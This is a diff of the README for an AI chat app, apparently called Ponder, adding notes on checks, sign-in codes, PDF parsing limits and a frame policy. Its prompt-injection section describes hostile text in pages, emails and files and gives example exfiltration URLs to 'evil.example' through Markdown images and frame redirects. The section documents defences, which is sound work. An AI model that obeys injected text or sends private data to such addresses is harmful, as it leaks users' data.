@@ -152,7 +152,7 @@ Two settings point Ponder at other servers, for the tests: `OPENROUTER_BASE_URL`
 
 Tests: `npm run e2e` builds Ponder and runs the end-to-end tests in a browser, with a fake OpenRouter in place of the real one, and test MCP servers for connectors. They need Docker for Postgres. See [`e2e/README.md`](e2e/README.md). CI runs them, the type checks, `server/trusted-pages.check.ts` and `server/mcp.check.ts` on every pull request.
 
-Checks: `npm run typecheck` (web), `npm run typecheck:server`, `npm run typecheck:e2e`, `npx tsx server/context.check.ts`, `npx tsx server/memory.check.ts`, `npx tsx server/search.check.ts [--live]`, `npx tsx server/trusted-pages.check.ts`, and `npx tsx server/mcp.check.ts [--live]` (with the app's environment; it writes two test people to the database and deletes them).
+Checks: `npm run typecheck` (web), `npm run typecheck:server`, `npm run typecheck:e2e`, `npx tsx server/context.check.ts`, `npx tsx server/memory.check.ts`, `npx tsx server/search.check.ts [--live]`, `npx tsx server/trusted-pages.check.ts`, `npx tsx server/fetch-page.check.ts`, `npx tsx server/pdf-text.check.ts`, and `npx tsx server/mcp.check.ts [--live]` (with the app's environment; it writes two test people to the database and deletes them).
 
 To try connectors locally, run `npx tsx server/mcp.check.ts --serve` (test MCP servers with no sign-in, an API key, and OAuth that signs in at once), and start Ponder with `MCP_ALLOW_PRIVATE_NETWORKS=1`.
 
@@ -164,7 +164,7 @@ Ponder started as a copy of the Seva platform with its Frappe parts removed. Pyt
 
 ### People, models and chats
 
-- Sign-in by email (Better Auth), for invited people only (`scripts/invite.ts`). One email holds a 6-digit code and a link. Either one signs the person in, so a mail scanner that opens the link first does not lock them out. Both expire in 15 minutes. A code takes 3 wrong tries.
+- Sign-in by email (Better Auth), for invited people only (`scripts/invite.ts`). One email holds a 6-digit code and a link. Either one signs the person in, so a mail scanner that opens the link first does not lock them out. Both expire in 15 minutes. A code takes 3 wrong tries. A code is checked only by signing in with it: Better Auth's route that checks a code alone is off, and so are codes of any type other than sign-in.
 - Admins: Better Auth's admin plugin gives each person a role, "user" or "admin", and stops a banned person from signing in. Run on the server with the app's environment: `npx tsx scripts/admin.ts grant someone@example.org`, `revoke <email>` or `list`.
 - Models: the list is in `server/models.ts`, and it is also the allowlist. A request for any other model gets the default.
 - Privacy: every OpenRouter call (replies, names, memory, embeddings) asks for Zero Data Retention endpoints only (`server/openrouter.ts`). The model menu shows only the models that have such an endpoint, from OpenRouter's public list. OpenRouter's own PDF parser is not covered by this rule.
@@ -246,6 +246,7 @@ The model sees two tools of our own (`server/search/schema.ts`), whatever runs t
 A page, an email from a connector or an attached file can hold text that tells the model what to do. The model can't reliably tell that text from the person's, so Ponder does not rely on the model to ignore it. It closes the ways that private data could leave without the person seeing it:
 
 - Images: the app's pages have a Content Security Policy (`server/app.ts`) that loads images and media only from Ponder, `data:` and `blob:` URLs, and the CDNs an HTML artifact may use. A Markdown image in a reply, such as `![](https://evil.example/?d=...)`, would otherwise load as soon as the reply shows. Artifact frames are `srcdoc` frames, so they are held to this policy too, as well as their own.
+- Frames: the same policy has `frame-src 'none'`, so no frame loads an address. An HTML artifact runs script in its frame, and could otherwise send the frame itself to `https://evil.example/?d=...`, by script or by a meta refresh. A `srcdoc` frame loads no address, so artifacts and slides still show.
 - `web_fetch`: asks first for an address that the person did not give and no search returned (see Web search).
 - Connector tools that change something are on "Ask first" by default, and Python has no network.
 
@@ -270,7 +271,7 @@ Settings, Connectors (from the account menu) lists the MCP servers the person co
 `server/files.ts` stores uploads; `server/file-context.ts` turns them into what the model reads before each call.
 
 - Images: the upload must really be a PNG, JPEG, WebP or GIF. A photo larger than 1,568 pixels on its long side is made smaller, and its metadata (such as where it was taken) is removed (`server/image-resize.ts`). GIFs stay as they are.
-- PDFs: the upload must start like a PDF. While the admin setting "Read PDF text on this server" is on (the default), the server reads each PDF's text once with pdf.js (`server/pdf-text.ts`) and keeps it in `files.text`. A model that can't read PDFs gets that text. A model that can read PDFs always gets the PDF. A scan has no text, so it goes as a PDF. With the setting off, every PDF goes to the model, and for models that can't read PDFs OpenRouter's free `cloudflare-ai` parser reads it on every call.
+- PDFs: the upload must start like a PDF. While the admin setting "Read PDF text on this server" is on (the default), the server reads each PDF's text once with pdf.js (`server/pdf-text.ts`) and keeps it in `files.text`. A model that can't read PDFs gets that text. A model that can read PDFs always gets the PDF. A scan has no text, so it goes as a PDF. pdf.js runs in a worker thread (`server/pdf-text-worker.ts`), two PDFs at a time, because a small PDF can be made to take hours to read. A read that takes more than 20 seconds or 256 MB is stopped, and that PDF is kept as one with no text. With the setting off, every PDF goes to the model, and for models that can't read PDFs OpenRouter's free `cloudflare-ai` parser reads it on every call.
 - Text files: up to 200,000 characters each.
 - All file text in one model call: at most 300,000 characters, newest files first. A file that does not fit is named, and the model is told to ask for it again in a new chat.
 
